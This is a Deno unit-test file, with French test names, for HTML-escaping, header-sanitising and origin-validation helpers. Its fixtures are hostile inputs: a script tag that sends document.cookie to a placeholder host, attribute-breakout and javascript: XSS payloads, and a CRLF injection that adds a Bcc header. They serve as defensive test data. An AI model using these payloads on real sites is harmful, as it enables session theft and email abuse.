import { assertEquals } from "https://deno.land/std@0.224.0/assert/mod.ts";
import { escapeHtml, escapeHtmlMultiline, safeOrigin, sanitizeHeaderText } from "./html.ts";

Deno.test("escapeHtml neutralise les cinq caractères dangereux", () => {
  assertEquals(escapeHtml(`<a href="x">&'`), "&lt;a href=&quot;x&quot;&gt;&amp;&#39;");
});

Deno.test("escapeHtml neutralise une balise script complète", () => {
  const injected = "<script>fetch('https://exemple.test?c='+document.cookie)</script>";
  const escaped = escapeHtml(injected);
  assertEquals(escaped.includes("<script"), false);
  assertEquals(escaped.includes("</script>"), false);
});

Deno.test("escapeHtml empêche la sortie d'un attribut", () => {
  const injected = `" onmouseover="alert(1)`;
  assertEquals(escapeHtml(injected).includes('"'), false);
});

Deno.test("escapeHtml rend une chaîne vide pour null et undefined", () => {
  assertEquals(escapeHtml(null), "");
  assertEquals(escapeHtml(undefined), "");
});

Deno.test("escapeHtmlMultiline échappe puis convertit les sauts de ligne", () => {
  assertEquals(escapeHtmlMultiline("a<b\nc"), "a&lt;b<br/>c");
  assertEquals(escapeHtmlMultiline("a\r\nb"), "a<br/>b");
});

Deno.test("sanitizeHeaderText retire les retours chariot et les contrôles", () => {
  assertEquals(sanitizeHeaderText("Objet\r\nBcc: victime@exemple.test"), "Objet Bcc: victime@exemple.test");
  assertEquals(sanitizeHeaderText("a\u0000b"), "a b");
});

Deno.test("sanitizeHeaderText borne la longueur", () => {
  assertEquals(sanitizeHeaderText("x".repeat(50), 10).length, 10);
});

Deno.test("safeOrigin conserve une origine http valide", () => {
  assertEquals(safeOrigin("https://akwaba.ci", "https://akwaba.app"), "https://akwaba.ci");
  assertEquals(safeOrigin("https://akwaba.ci/chemin?q=1", "https://akwaba.app"), "https://akwaba.ci");
});

Deno.test("safeOrigin refuse un schéma non http et une valeur libre", () => {
  assertEquals(safeOrigin("javascript:alert(1)", "https://akwaba.app"), "https://akwaba.app");
  assertEquals(safeOrigin('" onload="alert(1)', "https://akwaba.app"), "https://akwaba.app");
  assertEquals(safeOrigin("https://user:pass@akwaba.ci", "https://akwaba.app"), "https://akwaba.app");
  assertEquals(safeOrigin(null, "https://akwaba.app"), "https://akwaba.app");
});
